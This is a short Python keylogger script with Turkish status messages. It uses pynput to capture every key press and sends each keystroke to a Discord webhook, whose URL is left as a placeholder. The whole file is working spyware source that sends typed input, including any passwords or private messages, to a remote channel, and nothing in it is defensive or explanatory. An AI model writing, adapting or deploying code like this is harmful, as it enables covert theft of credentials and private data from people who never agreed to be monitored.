import requests
import json
from pynput import keyboard

webhook_url = "DISCORD_WEBHOOK_URL"

keys = []

def send_webhook_message(content):
    data = {
        "content": content
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    if response.status_code == 204:
        print("Mesaj başarıyla gönderildi.")
    else:
        print("Mesaj gönderilirken bir hata oluştu.")

def on_press(key):
    try:

        keys.append(key.char)
    except AttributeError:
        keys.append(key.name)
        

    send_webhook_message(f"Tuş vuruşu: {key}")

def on_release(key):

    if key == keyboard.Key.esc:
        return False


listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

while True:
    pass
